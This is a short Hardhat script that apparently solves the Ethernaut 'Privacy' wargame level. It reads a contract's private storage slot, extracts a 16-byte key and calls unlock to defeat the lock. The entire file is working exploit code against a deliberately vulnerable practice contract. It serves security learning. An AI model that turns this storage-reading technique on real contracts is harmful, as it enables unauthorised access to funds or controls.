const hre = require("hardhat");

async function main() {
  // Fetch account
  const [attacker] = await hre.ethers.getSigners();
  const INSTANCE_ADDRESS = "0x9AaBcE32B49FC0ef07dA5743B7F9eB99623C4427";

  // Fetch attack contract
  const privacy = await hre.ethers.getContractAt("Privacy", INSTANCE_ADDRESS);
  console.log(`Privacy contract fetched at ${privacy.address}\n`);

  // Attack...
  const storage = await hre.ethers.provider.getStorageAt(privacy.address, 5);
  const hex = storage.substring(2); // Remove the 0x (You technically don't need to as you'll need it later)
  const key = hex.substring(0, 32); // Get the first 16 bytes

  const transaction = await privacy.connect(attacker).unlock(`0x${key}`);
  await transaction.wait();

  console.log(`Attack complete...\n`);

  const status = await privacy.locked();
  console.log(`Privacy Status: ${status}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});